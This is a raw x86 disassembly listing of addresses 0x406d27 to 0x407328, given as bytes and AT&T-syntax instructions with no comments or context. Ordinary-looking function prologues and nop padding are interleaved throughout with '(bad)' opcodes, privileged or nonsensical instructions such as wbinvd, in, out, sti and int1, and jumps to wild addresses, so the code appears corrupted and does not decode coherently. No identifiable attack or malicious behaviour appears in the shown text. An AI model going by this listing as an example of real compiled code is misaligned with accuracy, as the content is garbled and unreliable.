  406d27:	a3 ec 04 41 00       	mov    %eax,0x4104ec
  406d2c:	8b 45 08             	mov    0x8(%ebp),%eax
  406d2f:	c7 05 40 05 41 00 01 	movl   $0x1,0x410540
  406d36:	00 00 00 
  406d39:	c7 00 40 04 41 29    	movl   $0x29410440,(%eax)
  406d3f:	a1 ec 01 41 00       	mov    0x4101ec,%eax
  406d44:	01 3b                	add    %edi,(%ebx)
  406d46:	f5                   	cmc
  406d47:	09 08                	or     %ecx,(%eax)
  406d49:	c4 72 40             	les    0x40(%edx),%esi
  406d4c:	6d                   	insl   (%dx),%es:(%edi)
  406d4d:	41                   	inc    %ecx
  406d4e:	00 a1 ec 41 41 17    	add    %ah,0x174141ec(%ecx)
  406d54:	5d                   	pop    %ebp
  406d55:	c3                   	ret
  406d56:	19 90 0c 43 b5 76    	sbb    %edx,0x76b5430c(%eax)
  406d5c:	90                   	nop
  406d5d:	90                   	nop
  406d5e:	90                   	nop
  406d5f:	87 55 8b             	xchg   %edx,-0x75(%ebp)
  406d62:	ec                   	in     (%dx),%al
  406d63:	8b 82 0c 8b 4d 08    	mov    0x84d8b0c(%edx),%eax
  406d69:	69 65 68 e8 91 00 00 	imul   $0x91e8,0x68(%ebp),%esp
  406d70:	aa                   	stos   %al,%es:(%edi)
  406d71:	0c e8                	or     $0xe8,%al
  406d73:	19 48 00             	sbb    %ecx,0x0(%eax)
  406d76:	00 50 ff             	add    %dl,-0x1(%eax)
  406d79:	15 90 c0 40 00       	adc    $0x40c090,%eax
  406d7e:	5d                   	pop    %ebp
  406d7f:	c2 08 00             	ret    $0x8
  406d82:	62                   	(bad)
  406d83:	ec                   	in     (%dx),%al
  406d84:	45                   	inc    %ebp
  406d85:	90                   	nop
  406d86:	90                   	nop
  406d87:	90                   	nop
  406d88:	90                   	nop
  406d89:	90                   	nop
  406d8a:	90                   	nop
  406d8b:	90                   	nop
  406d8c:	90                   	nop
  406d8d:	90                   	nop
  406d8e:	90                   	nop
  406d8f:	90                   	nop
  406d90:	55                   	push   %ebp
  406d91:	8b ec                	mov    %esp,%ebp
  406d93:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406d96:	56                   	push   %esi
  406d97:	8b 75 0c             	mov    0xc(%ebp),%esi
  406d9a:	57                   	push   %edi
  406d9b:	8b 7d 08             	mov    0x8(%ebp),%edi
  406d9e:	8b 48 20             	mov    0x20(%eax),%ecx
  406da1:	b6 50                	mov    $0x50,%dh
  406da3:	5f                   	pop    %edi
  406da4:	5a                   	pop    %edx
  406da5:	57                   	push   %edi
  406da6:	8d 52 e8             	lea    -0x18(%edx),%edx
  406da9:	e3 86                	jecxz  0x406d31
  406dab:	00 56 83             	add    %dl,-0x7d(%esi)
  406dae:	c4 10                	les    (%eax),%edx
  406db0:	85 8e 75 0b 5f b8    	test   %ecx,-0x47a0f48b(%esi)
  406db6:	8e 00                	mov    (%eax),%es
  406db8:	45                   	inc    %ebp
  406db9:	c3                   	ret
  406dba:	5e                   	pop    %esi
  406dbb:	5d                   	pop    %ebp
  406dbc:	c2 0c 00             	ret    $0xc
  406dbf:	c6                   	(bad)
  406dc0:	a0 37 ff 86 5f       	mov    0x5f86ff37,%al
  406dc5:	33 c0                	xor    %eax,%eax
  406dc7:	63 5d c2             	arpl   %ebx,-0x3e(%ebp)
  406dca:	0c 00                	or     $0x0,%al
  406dcc:	42                   	inc    %edx
  406dcd:	90                   	nop
  406dce:	af                   	scas   %es:(%edi),%eax
  406dcf:	90                   	nop
  406dd0:	55                   	push   %ebp
  406dd1:	8b ec                	mov    %esp,%ebp
  406dd3:	53                   	push   %ebx
  406dd4:	8b a4 61 39 8b bc 08 	mov    0x8bc8b39(%ecx,%eiz,2),%esp
  406ddb:	57                   	push   %edi
  406ddc:	8b 7d 10             	mov    0x10(%ebp),%edi
  406ddf:	66 85 c1             	test   %ax,%cx
  406de2:	89 5e 10             	mov    %ebx,0x10(%esi)
  406de5:	da 89 5e 28 74 0f    	fimull 0xf74285e(%ecx)
  406deb:	57                   	push   %edi
  406dec:	ff 15 a8 c1 40 00    	call   *0x40c1a8
  406df2:	66 dd cf             	data16 (bad)
  406df5:	f8                   	clc
  406df6:	28 7c 7e 0c          	sub    %bh,0xc(%esi,%edi,2)
  406dfa:	83 fb c5             	cmp    $0xffffffc5,%ebx
  406dfd:	75 4a                	jne    0x406e49
  406dff:	16                   	push   %ss
  406e00:	10 00                	adc    %al,(%eax)
  406e02:	00 c9                	add    %cl,%cl
  406e04:	c7 46 18 04 00 fd 00 	movl   $0xfd0004,0x18(%esi)
  406e0b:	89 1d 14 89 46 1c    	mov    %ebx,0x1c468914
  406e11:	8d 46 2c             	lea    0x2c(%esi),%eax
  406e14:	4b                   	dec    %ebx
  406e15:	46                   	inc    %esi
  406e16:	81 5f 5e d0 5d c3 90 	sbbl   $0x90c35dd0,0x5e(%edi)
  406e1d:	90                   	nop
  406e1e:	90                   	nop
  406e1f:	90                   	nop
  406e20:	55                   	push   %ebp
  406e21:	db e8                	fucomi %st(0),%st
  406e23:	8b 45 08             	mov    0x8(%ebp),%eax
  406e26:	8b 4d d1             	mov    -0x2f(%ebp),%ecx
  406e29:	8b 7a 10             	mov    0x10(%edx),%edi
  406e2c:	53                   	push   %ebx
  406e2d:	8b 5d 14             	mov    0x14(%ebp),%ebx
  406e30:	56                   	push   %esi
  406e31:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  406e37:	57                   	push   %edi
  406e38:	c7 01 23 00 00 00    	movl   $0x23,(%ecx)
  406e3e:	8b fb                	mov    %ebx,%edi
  406e40:	83 c9 ff             	or     $0xffffffff,%ecx
  406e43:	6f                   	outsl  %ds:(%esi),(%dx)
  406e44:	c0 66 c7 59          	shlb   $0x59,-0x39(%esi)
  406e48:	a1 00 f2 4e f7       	mov    0xf74ef200,%eax
  406e4d:	d1 49 8d             	rorl   $1,-0x73(%ecx)
  406e50:	74 19                	je     0x406e6b
  406e52:	ff                   	(bad)
  406e53:	3b f3                	cmp    %ebx,%esi
  406e55:	8b fe                	mov    %esi,%edi
  406e57:	72 3c                	jb     0x406e95
  406e59:	4c                   	dec    %esp
  406e5a:	74 c1                	je     0x406e1d
  406e5c:	e1 4b                	loope  0x406ea9
  406e5e:	83 38 01             	cmpl   $0x1,(%eax)
  406e61:	20 12                	and    %dl,(%edx)
  406e63:	33 c9                	xor    %ecx,%ecx
  406e65:	3e 04 8a             	ds add $0x8a,%al
  406e68:	0f 09                	wbinvd
  406e6a:	ff 15 68 c1 40 59    	call   *0x5940c168
  406e70:	83 9f 66 eb 11 24 78 	sbbl   $0x78,0x2411eb66(%edi)
  406e77:	3c b0                	cmp    $0xb0,%al
  406e79:	00 33                	add    %dh,(%ebx)
  406e7b:	d2 8a 88 8b 08 c9    	rorb   %cl,-0x36f77478(%edx)
  406e81:	04 51                	add    $0x51,%al
  406e83:	21 e0                	and    %esp,%eax
  406e85:	04 85                	add    $0x85,%al
  406e87:	c0 74 3a 4f 3b       	shlb   $0x3b,0x4f(%edx,%edi,1)
  406e8c:	fb                   	sti
  406e8d:	73 ca                	jae    0x406e59
  406e8f:	eb 04                	jmp    0x406e95
  406e91:	7d 5f                	jge    0x406ef2
  406e93:	1a 25 53 cf 15 9a    	sbb    0x9a15cf53,%ah
  406e99:	76 27                	jbe    0x406ec2
  406e9b:	00 83 c4 04 a6 f8    	add    %al,-0x759fb3c(%ebx)
  406ea1:	01 7c 8e c5          	add    %edi,-0x3b(%esi,%ecx,4)
  406ea5:	ff                   	(bad)
  406ea6:	ff 00                	incl   (%eax)
  406ea8:	00 7f 1c             	add    %bh,0x1c(%edi)
  406eab:	55                   	push   %ebp
  406eac:	55                   	push   %ebp
  406ead:	10 5f 5e             	adc    %bl,0x5e(%edi)
  406eb0:	82 66 8e 02          	andb   $0x2,-0x72(%esi)
  406eb4:	33 c0                	xor    %eax,%eax
  406eb6:	07                   	pop    %es
  406eb7:	c2 14 00             	ret    $0x14
  406eba:	80 3f 3a             	cmpb   $0x3a,(%edi)
  406ebd:	f1                   	int1
  406ebe:	36 3b fe             	ss cmp %esi,%edi
  406ec1:	5f                   	pop    %edi
  406ec2:	32 3b                	xor    (%ebx),%bh
  406ec4:	fb                   	sti
  406ec5:	75 be                	jne    0x406e85
  406ec7:	42                   	inc    %edx
  406ec8:	5e                   	pop    %esi
  406ec9:	b8 16 00 00 2f       	mov    $0x2f000016,%eax
  406ece:	d1 5d c2             	rcrl   $1,-0x3e(%ebp)
  406ed1:	46                   	inc    %esi
  406ed2:	00 42 47             	add    %al,0x47(%edx)
  406ed5:	01 50 3a             	add    %edx,0x3a(%eax)
  406ed8:	e2 6c                	loop   0x406f46
  406eda:	c1 40 00 83          	roll   $0x83,0x0(%eax)
  406ede:	25 04 83 f8 92       	and    $0x92f88304,%eax
  406ee3:	7c e2                	jl     0x406ec7
  406ee5:	3d ff ff 00 25       	cmp    $0x2500ffff,%eax
  406eea:	d4 db                	aam    $0xdb
  406eec:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406eef:	8d 77 ff             	lea    -0x1(%edi),%esi
  406ef2:	66 89 01             	mov    %ax,(%ecx)
  406ef5:	c5 37                	lds    (%edi),%esi
  406ef7:	6a 45                	push   $0x45
  406ef9:	18 d9                	sbb    %bl,%cl
  406efb:	8b 67 8d             	mov    -0x73(%edi),%esp
  406efe:	53                   	push   %ebx
  406eff:	a1 13 09 e8 59       	mov    0x59e80913,%eax
  406f04:	db ff                	(bad)
  406f06:	10 8b 55 08 8b 75    	adc    %cl,0x758b0855(%ebx)
  406f0c:	b4 98                	mov    $0x98,%ah
  406f0e:	d1 8b f8 89 02 8b    	rorl   $1,-0x74fd7608(%ebx)
  406f14:	6b c1 e9             	imul   $0xffffffe9,%ecx,%eax
  406f17:	ce                   	into
  406f18:	f3 fd                	repz std
  406f1a:	8b c8                	mov    %eax,%ecx
  406f1c:	21 b5 03 33 c0 f3    	and    %esi,-0xc3fccfd(%ebp)
  406f22:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406f23:	42                   	inc    %edx
  406f24:	0a 5f 5e             	or     0x5e(%edi),%bl
  406f27:	c6 04 0b 00          	movb   $0x0,(%ebx,%ecx,1)
  406f2b:	5b                   	pop    %ebx
  406f2c:	ee                   	out    %al,(%dx)
  406f2d:	c2 5e 00             	ret    $0x5e
  406f30:	55                   	push   %ebp
  406f31:	8b ec                	mov    %esp,%ebp
  406f33:	72 dc                	jb     0x406f11
  406f35:	18 8b 55 1a 8b c1    	sbb    %cl,-0x3e74e5ab(%ebx)
  406f3b:	56                   	push   %esi
  406f3c:	8b e3                	mov    %ebx,%esp
  406f3e:	77 16                	ja     0x406f56
  406f40:	e0 03                	loopne 0x406f45
  406f42:	57                   	push   %edi
  406f43:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  406f49:	74 2b                	je     0x406f76
  406f4b:	79 f6                	jns    0x406f43
  406f4d:	13 1c 8b             	adc    (%ebx,%ecx,4),%ebx
  406f50:	7d 10                	jge    0x406f62
  406f52:	85 dc                	test   %ebx,%esp
  406f54:	75 15                	jne    0x406f6b
  406f56:	83 28 03             	subl   $0x3,(%eax)
  406f59:	aa                   	stos   %al,%es:(%edi)
  406f5a:	10 f6                	adc    %dh,%dh
  406f5c:	4b                   	dec    %ebx
  406f5d:	02 74 1d 5f          	add    0x5f(%ebp,%ebx,1),%dh
  406f61:	e4 87                	in     $0x87,%al
  406f63:	11 b7 b8 5e 5d c2    	adc    %esi,-0x3da2a148(%edi)
  406f69:	d9 00                	flds   (%eax)
  406f6b:	5f                   	pop    %edi
  406f6c:	1f                   	pop    %ds
  406f6d:	16                   	push   %ss
  406f6e:	66 01 00             	add    %ax,(%eax)
  406f71:	5e                   	pop    %esi
  406f72:	fd                   	std
  406f73:	c2 38 00             	ret    $0x38
  406f76:	8b 45 10             	mov    0x10(%ebp),%eax
  406f79:	f7 c0 75 9a b8 02    	test   $0x2b89a75,%eax
  406f7f:	bb 00 64 8b 7d       	mov    $0x7d8b6400,%ebx
  406f84:	1c 57                	sbb    $0x57,%al
  406f86:	0e                   	push   %cs
  406f87:	8b e1                	mov    %ecx,%esp
  406f89:	14 51                	adc    $0x51,%al
  406f8b:	50                   	push   %eax
  406f8c:	56                   	push   %esi
  406f8d:	f8                   	clc
  406f8e:	50                   	push   %eax
  406f8f:	0d 00 00 96 83       	or     $0x83960000,%eax
  406f94:	c4 18                	les    (%eax),%ebx
  406f96:	f3 5e                	repz pop %esi
  406f98:	5d                   	pop    %ebp
  406f99:	e3 18                	jecxz  0x406fb3
  406f9b:	00 04 c2             	add    %al,(%edx,%eax,8)
  406f9e:	90                   	nop
  406f9f:	90                   	nop
  406fa0:	55                   	push   %ebp
  406fa1:	8b ec                	mov    %esp,%ebp
  406fa3:	83 ec 24             	sub    $0x24,%esp
  406fa6:	53                   	push   %ebx
  406fa7:	ea 8b 75 0c 33 db 3b 	ljmp   $0x3bdb,$0x330c758b
  406fae:	f3 13 2e             	repz adc (%esi),%ebp
  406fb1:	f9                   	stc
  406fb2:	89 75 25             	mov    %esi,0x25(%ebp)
  406fb5:	be 40 7d 4e 00       	mov    $0x4e7d40,%esi
  406fba:	8a 06                	mov    (%esi),%al
  406fbc:	3c 30                	cmp    $0x30,%al
  406fbe:	0f 8c b9 2d 00 ec    	jl     0xec409d7d
  406fc4:	3c 39                	cmp    $0x39,%al
  406fc6:	0f 8f b1 00 00 00    	jg     0x40707d
  406fcc:	40                   	inc    %eax
  406fcd:	08 f4                	or     %dh,%ah
  406fcf:	40                   	inc    %eax
  406fd0:	00 56 ff             	add    %dl,-0x1(%esi)
  406fd3:	25 1c c1 40 0c       	and    $0xc40c11c,%eax
  406fd8:	9c                   	pushf
  406fd9:	d0 8b fe 83 c9 c0    	rorb   $1,-0x3f367c02(%ebx)
  406fdf:	11 46 83             	adc    %eax,-0x7d(%esi)
  406fe2:	7f 9e                	jg     0x406f82
  406fe4:	3f                   	aas
  406fe5:	ae                   	scas   %es:(%edi),%al
  406fe6:	f7 bd 49 55 d1 0f    	idivl  0xfd15549(%ebp)
  406fec:	85 8c 39 fd 00 56 ff 	test   %ecx,-0xa9ff03(%ecx,%edi,1)
  406ff3:	15 c8 6a 40 00       	adc    $0x406ac8,%eax
  406ff8:	89 c1                	mov    %eax,%ecx
  406ffa:	f8                   	clc
  406ffb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406ffe:	ac                   	lods   %ds:(%esi),%al
  406fff:	4d                   	dec    %ebp
  407000:	80 8d 55 dc 89 45 ec 	orb    $0xec,0x4589dc55(%ebp)
  407007:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40700a:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40700d:	89 55 0c             	mov    %edx,0xc(%ebp)
  407010:	8b 45 0c             	mov    0xc(%ebp),%eax
  407013:	8b 48 0c             	mov    0xc(%eax),%ecx
  407016:	39 19                	cmp    %ebx,(%ecx)
  407018:	11 84 a8 00 00 00 89 	adc    %eax,-0x77000000(%eax,%ebp,4)
  40701f:	5d                   	pop    %ebp
  407020:	fc                   	cld
  407021:	8b 55 1c             	mov    0x1c(%ebp),%edx
  407024:	e1 67                	loope  0x40708d
  407026:	52                   	push   %edx
  407027:	88 4c da ff          	mov    %cl,-0x1(%edx,%ebx,8)
  40702b:	ff 8b f8 9c c0 8b    	decl   -0x743f6308(%ebx)
  407031:	f7 b9 6e 00 36 00    	idivl  0x36006e(%ecx)
  407037:	f3 ab                	rep stos %eax,%es:(%edi)
  407039:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40703c:	8b 99 0c 8b c0 fc    	mov    -0x33f74f4(%ecx),%ebx
  407042:	89 65 8b             	mov    %esp,-0x75(%ebp)
  407045:	51                   	push   %ecx
  407046:	0c a0                	or     $0xa0,%al
  407048:	f6 17                	notb   (%edi)
  40704a:	8b 15 14 52 01 86    	mov    0x86015214,%edx
  407050:	8b 08                	mov    (%eax),%ecx
  407052:	56                   	push   %esi
  407053:	9f                   	lahf
  407054:	4e                   	dec    %esi
  407055:	2c e8                	sub    $0xe8,%al
  407057:	75 e2                	jne    0x40703b
  407059:	ff                   	(bad)
  40705a:	ff 83 c4 0c 9f db    	incl   -0x2460f33c(%ebx)
  407060:	75 43                	jne    0x4070a5
  407062:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407065:	49                   	dec    %ecx
  407066:	c0 74 d5 50 51       	shlb   $0x51,0x50(%ebp,%edx,8)
  40706b:	45                   	inc    %ebp
  40706c:	1c 50                	sbb    $0x50,%al
  40706e:	e8 dd e7 ff ff       	call   0x405850
  407073:	89 46 04             	mov    %eax,0x4(%esi)
  407076:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407079:	be 31 eb 31 56       	mov    $0x5631eb31,%esi
  40707e:	ff 8e 20 c1 37 00    	decl   0x37c120(%esi)
  407084:	82 c3 89             	add    $0x89,%bl
  407087:	4d                   	dec    %ebp
  407088:	0c 75                	or     $0x75,%al
  40708a:	85 8b b5 d8 b9 40    	test   %ecx,0x40b9d8b5(%ebx)
  407090:	00 ff                	add    %bh,%bh
  407092:	d6                   	salc
  407093:	85 f3                	test   %esi,%ebx
  407095:	74 2f                	je     0x4070c6
  407097:	ff d6                	call   *%esi
  407099:	5f                   	pop    %edi
  40709a:	5e                   	pop    %esi
  40709b:	05 80 fc 0a 00       	add    $0xafc80,%eax
  4070a0:	8c 8b c6 5d c3 8b    	mov    %cs,-0x743ca23a(%ebx)
  4070a6:	53                   	push   %ebx
  4070a7:	04 89                	add    $0x89,%al
  4070a9:	56                   	push   %esi
  4070aa:	04 89                	add    $0x89,%al
  4070ac:	dc 5e 8b             	fcompl -0x75(%esi)
  4070af:	45                   	inc    %ebp
  4070b0:	0c c9                	or     $0xc9,%al
  4070b2:	c7 04 8b de 89 7d e0 	movl   $0xe07d89de,(%ebx,%ecx,4)
  4070b9:	8b 48 0c             	mov    0xc(%eax),%ecx
  4070bc:	83 4d 0f d1          	orl    $0xffffffd1,0xf(%ebp)
  4070c0:	0f c6 5b ff ff       	shufps $0xff,-0x1(%ebx),%xmm3
  4070c5:	ff 5f 00             	lcall  *0x0(%edi)
  4070c8:	33 c0                	xor    %eax,%eax
  4070ca:	5b                   	pop    %ebx
  4070cb:	8b e5                	mov    %ebp,%esp
  4070cd:	5d                   	pop    %ebp
  4070ce:	c3                   	ret
  4070cf:	35 55 0b ec 81       	xor    $0x81ec0b55,%eax
  4070d4:	ec                   	in     (%dx),%al
  4070d5:	54                   	push   %esp
  4070d6:	02 00                	add    (%eax),%al
  4070d8:	00 8b 4d 0c 6b 56    	add    %cl,0x566b0c4d(%ebx)
  4070de:	75 f6                	jne    0x4070d6
  4070e0:	8b 01                	mov    (%ecx),%eax
  4070e2:	8b 51 04             	mov    0x4(%ecx),%edx
  4070e5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4070e8:	8b d7                	mov    %edi,%edx
  4070ea:	10 57 89             	adc    %dl,-0x77(%edi)
  4070ed:	75 61                	jne    0x407150
  4070ef:	8a 00                	mov    (%eax),%al
  4070f1:	b7 83                	mov    $0x83,%bh
  4070f3:	fc                   	cld
  4070f4:	a9 c0 89 75 9c       	test   $0x9c7589c0,%eax
  4070f9:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4070fc:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4070ff:	89 55 bf             	mov    %edx,-0x41(%ebp)
  407102:	09 63 aa             	or     %esp,-0x56(%ebx)
  407105:	0a 00                	or     (%eax),%al
  407107:	00 8b 5d 14 3c e7    	add    %cl,-0x18c3eba3(%ebx)
  40710d:	74 3c                	je     0x40714b
  40710f:	8b 45 6d             	mov    0x6d(%ebp),%eax
  407112:	85 c0                	test   %eax,%eax
  407114:	f8                   	clc
  407115:	2d 3b ba dc 72       	sub    $0x72dcba3b,%eax
  40711a:	1c 8b                	sbb    $0x8b,%al
  40711c:	7d 0c                	jge    0x40712a
  40711e:	90                   	nop
  40711f:	89 07                	mov    %eax,(%edi)
  407121:	ff 55 08             	call   *0x8(%ebp)
  407124:	83 ea 04             	sub    $0x4,%edx
  407127:	85 e2                	test   %esp,%edx
  407129:	89 85 94 0a 6d 7e    	mov    %eax,0x7e6d0a94(%ebp)
  40712f:	8b 4f 04             	mov    0x4(%edi),%ecx
  407132:	8b 07                	mov    (%edi),%eax
  407134:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  407137:	8b 55 10             	mov    0x10(%ebp),%edx
  40713a:	40                   	inc    %eax
  40713b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40713e:	8a cb                	mov    %bl,%cl
  407140:	88 48 ff             	mov    %cl,-0x1(%eax)
  407143:	ff 45 ec             	incl   -0x14(%ebp)
  407146:	e9 54 0a 19 76       	jmp    0x76597b9f
  40714b:	93                   	xchg   %eax,%ebx
  40714c:	7d 10                	jge    0x40715e
  40714e:	8b 0d 74 c1 40 00    	mov    0x40c174,%ecx
  407154:	b8 91 00 00 69       	mov    $0x69000091,%eax
  407159:	33 d2                	xor    %edx,%edx
  40715b:	47                   	inc    %edi
  40715c:	aa                   	stos   %al,%es:(%edi)
  40715d:	01 5e be             	add    %ebx,-0x42(%esi)
  407160:	bc 89 45 77 89       	mov    $0x89774589,%esp
  407165:	55                   	push   %ebp
  407166:	c8 89 09 c4          	enter  $0x989,$0xc4
  40716a:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  40716d:	c6 45 17 20          	movb   $0x20,0x17(%ebp)
  407171:	88 55 fb             	mov    %dl,-0x5(%ebp)
  407174:	5c                   	pop    %esp
  407175:	7d 6f                	jge    0x4071e6
  407177:	05 78 8a 17 6a       	add    $0x6a178a78,%eax
  40717c:	02 52 ff             	add    -0x1(%edx),%dl
  40717f:	15 e8 c1 40 00       	adc    $0x40c1e8,%eax
  407184:	83 c4 08             	add    $0x8,%esp
  407187:	33 d2                	xor    %edx,%edx
  407189:	eb 12                	jmp    0x40719d
  40718b:	8b 0d 78 c1 40 00    	mov    0x40c178,%ecx
  407191:	33 c0                	xor    %eax,%eax
  407193:	8a 07                	mov    (%edi),%al
  407195:	b7 09                	mov    $0x9,%bh
  407197:	8a 04 b9             	mov    (%ecx,%edi,4),%al
  40719a:	83 e0 e7             	and    $0xffffffe7,%eax
  40719d:	3b c2                	cmp    %edx,%eax
  40719f:	0f 85 c9 01 00 00    	jne    0x40736e
  4071a5:	b9 01 00 00 00       	mov    $0x1,%ecx
  4071aa:	8a 07                	mov    (%edi),%al
  4071ac:	b0 2d                	mov    $0x2d,%al
  4071ae:	75 06                	jne    0x4071b6
  4071b0:	89 55 c0             	mov    %edx,-0x40(%ebp)
  4071b3:	f5                   	cmc
  4071b4:	eb f4                	jmp    0x4071aa
  4071b6:	3c 59                	cmp    $0x59,%al
  4071b8:	75 06                	jne    0x4071c0
  4071ba:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  4071bd:	48                   	dec    %eax
  4071be:	0b 55 3c             	or     0x3c(%ebp),%edx
  4071c1:	23 75 06             	and    0x6(%ebp),%esi
  4071c4:	9c                   	pushf
  4071c5:	4d                   	dec    %ebp
  4071c6:	d4 47                	aam    $0x47
  4071c8:	eb e0                	jmp    0x4071aa
  4071ca:	6b 1a 75             	imul   $0x75,(%edx),%ebx
  4071cd:	06                   	push   %es
  4071ce:	89 4d 9a             	mov    %ecx,-0x66(%ebp)
  4071d1:	bc eb f5 3c 30       	mov    $0x303cf5eb,%esp
  4071d6:	75 ea                	jne    0x4071c2
  4071d8:	88 45 86             	mov    %al,-0x7a(%ebp)
  4071db:	47                   	inc    %edi
  4071dc:	16                   	push   %ss
  4071dd:	cc                   	int3
  4071de:	a1 04 c1 40 00       	mov    0x40c104,%eax
  4071e3:	89 7d 10             	mov    %edi,0x10(%ebp)
  4071e6:	c3                   	ret
  4071e7:	4c                   	dec    %esp
  4071e8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071e9:	14 33                	adc    $0x33,%al
  4071eb:	c9                   	leave
  4071ec:	9f                   	lahf
  4071ed:	2c 8a                	sub    $0x8a,%al
  4071ef:	0f 51 ff             	sqrtps %xmm7,%xmm7
  4071f2:	87 68 c1             	xchg   %ebp,-0x3f(%eax)
  4071f5:	40                   	inc    %eax
  4071f6:	00 11                	add    %dl,(%ecx)
  4071f8:	c4 08                	les    (%eax),%ecx
  4071fa:	33 d2                	xor    %edx,%edx
  4071fc:	ba 12 ac 0d 78       	mov    $0x780dac12,%edx
  407201:	c1 40 00 33          	roll   $0x33,0x0(%eax)
  407205:	c0 8a 07 8b 09 8a 04 	rorb   $0x4,-0x75f674f9(%edx)
  40720c:	08 e0                	or     %ah,%al
  40720e:	15 04 3b e9 74       	adc    $0x74e93b04,%eax
  407213:	5d                   	pop    %ebp
  407214:	9e                   	sahf
  407215:	be 0f 98 e9 30       	mov    $0x30e9980f,%esi
  40721a:	47                   	inc    %edi
  40721b:	89 7d 4d             	mov    %edi,0x4d(%ebp)
  40721e:	a2 15 74 c1 40       	mov    %al,0x40c17415
  407223:	00 89 4d e0 83 90    	add    %cl,-0x6f7c1fb3(%ecx)
  407229:	c3                   	ret
  40722a:	7e 62                	jle    0x40728e
  40722c:	33 c0                	xor    %eax,%eax
  40722e:	60                   	pusha
  40722f:	37                   	aaa
  407230:	8a 07                	mov    (%edi),%al
  407232:	cc                   	int3
  407233:	ff 15 68 c1 44 00    	call   *0x44c168
  407239:	8b 8a e0 83 c4 38    	mov    0x38c483e0(%edx),%ecx
  40723f:	7b 11                	jnp    0x407252
  407241:	fa                   	cli
  407242:	78 c1                	js     0x407205
  407244:	40                   	inc    %eax
  407245:	00 33                	add    %dh,(%ebx)
  407247:	d2 8a 17 8b 65 8a    	rorb   %cl,-0x759a74e9(%edx)
  40724d:	04 50                	add    $0x50,%al
  40724f:	83 e0 04             	and    $0x4,%eax
  407252:	33 d2                	xor    %edx,%edx
  407254:	3b c2                	cmp    %edx,%eax
  407256:	74 0d                	je     0x407265
  407258:	0f be 17             	movsbl (%edi),%edx
  40725b:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  40725e:	c1 8d 4c b6 d0 eb b9 	rorl   $0xb9,-0x142f49b4(%ebp)
  407265:	00 7d 10             	add    %bh,0x10(%ebp)
  407268:	c7 45 7a 01 00 14 00 	movl   $0x140001,0x7a(%ebp)
  40726f:	eb 26                	jmp    0x407297
  407271:	80 3f 2b             	cmpb   $0x2b,(%edi)
  407274:	d0 1e                	rcrb   $1,(%esi)
  407276:	8b 03                	mov    (%ebx),%eax
  407278:	38 c3                	cmp    %al,%bl
  40727a:	04 42                	add    $0x42,%al
  40727c:	be c2 ba 83 10       	mov    $0x1083bac2,%esi
  407281:	c7 45 cc 01 03 87 00 	movl   $0x870301,-0x34(%ebp)
  407288:	7d 05                	jge    0x40728f
  40728a:	4e                   	dec    %esi
  40728b:	55                   	push   %ebp
  40728c:	b5 f7                	mov    $0xf7,%ch
  40728e:	d8 89 45 e0 eb 03    	fmuls  0x3ebe045(%ecx)
  407294:	89 55 cc             	mov    %edx,-0x34(%ebp)
  407297:	2c ac                	sub    $0xac,%al
  407299:	a1 0f 85 d1 00       	mov    0xd1850f,%eax
  40729e:	00 00                	add    %al,(%eax)
  4072a0:	a1 ff c1 40 61       	mov    0x6140c1ff,%eax
  4072a5:	47                   	inc    %edi
  4072a6:	c7 45 e4 07 00 00 00 	movl   $0x7,-0x1c(%ebp)
  4072ad:	89 7d 10             	mov    %edi,0x10(%ebp)
  4072b0:	83 38 01             	cmpl   $0x1,(%eax)
  4072b3:	7e 14                	jle    0x4072c9
  4072b5:	e6 c9                	out    %al,$0xc9
  4072b7:	60                   	pusha
  4072b8:	04 00                	add    $0x0,%al
  4072ba:	0f 51 ff             	sqrtps %xmm7,%xmm7
  4072bd:	15 68 c1 40 00       	adc    $0x40c168,%eax
  4072c2:	83 c4 08             	add    $0x8,%esp
  4072c5:	33 d2                	xor    %edx,%edx
  4072c7:	eb 12                	jmp    0x4072db
  4072c9:	8b 0d 78 c1 aa 00    	mov    0xaac178,%ecx
  4072cf:	33 c0                	xor    %eax,%eax
  4072d1:	8a 07                	mov    (%edi),%al
  4072d3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4072d4:	09 8a 04 81 83 e0    	or     %ecx,-0x1f7c7efc(%edx)
  4072da:	04 8a                	add    $0x8a,%al
  4072dc:	68 74 4f 63 be       	push   $0xbe634f74
  4072e1:	0f 83 34 30 47 1d    	jae    0x1d87a31b
  4072e7:	33 5e 8b             	xor    -0x75(%esi),%ebx
  4072ea:	15 74 c8 40 00       	adc    $0x40c874,%eax
  4072ef:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4072f2:	83 95 73 7e 15 33 67 	adcl   $0x67,0x33157e73(%ebp)
  4072f9:	6a 04                	push   $0x4
  4072fb:	8a 07                	mov    (%edi),%al
  4072fd:	ba 93 15 68 c1       	mov    $0xc1681593,%edx
  407302:	40                   	inc    %eax
  407303:	00 8b 98 f0 83 c4    	add    %cl,-0x3b7c0f68(%ebx)
  407309:	08 eb                	or     %ch,%bl
  40730b:	ce                   	into
  40730c:	a1 78 c1 40 00       	mov    0x40c178,%eax
  407311:	6d                   	insl   (%dx),%es:(%edi)
  407312:	d2 8a 41 8b 00 8a    	rorb   %cl,-0x75ff74bf(%edx)
  407318:	04 50                	add    $0x50,%al
  40731a:	a9 a0 04 85 c0       	test   $0xc08504a0,%eax
  40731f:	74 25                	je     0x407346
  407321:	0f be 17             	movsbl (%edi),%edx
  407324:	1c 0c                	sbb    $0xc,%al
  407326:	4c                   	dec    %esp
  407327:	cc                   	int3
  407328:	8d 4c 4a d0          	lea    -0x30(%edx,%ecx,2),%ecx
